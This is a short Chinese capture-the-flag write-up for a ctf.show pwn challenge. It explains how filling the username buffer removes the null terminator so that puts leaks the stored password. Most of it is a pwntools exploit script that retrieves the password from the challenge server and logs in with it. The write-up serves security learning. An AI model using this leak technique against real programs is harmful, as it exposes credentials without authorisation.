# 挑战简介
再近一点靠近点快被融化

# 思路
一个要你输入用户名以及密码的程序，只要你的密码输入正确，就可以获得flag  

我们可以充分利用puts函数，puts遇到\x00才会终止输出，而用户名，密码早就利用fgets进入了输出流，所以我们可以利用栈溢出来填补用户名的\x00，直到密码的栈区块，从而将password输出出来即可

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

p = remote("pwn.challenge.ctf.show",28228)
elf = ELF('D:\edge 下载\pwn')

p.recvuntil("Input your Username:\n")

p.send(b"a"*255 + b"b")

p.recv(264)

password = p.recv()

print(password)

p = remote("pwn.challenge.ctf.show",28228)

p.recvuntil("Input your Username:\n")

p.sendline("a")

p.recvuntil("a")

payload = password

p.sendline(payload)

p.recv()

p.interactive()

```
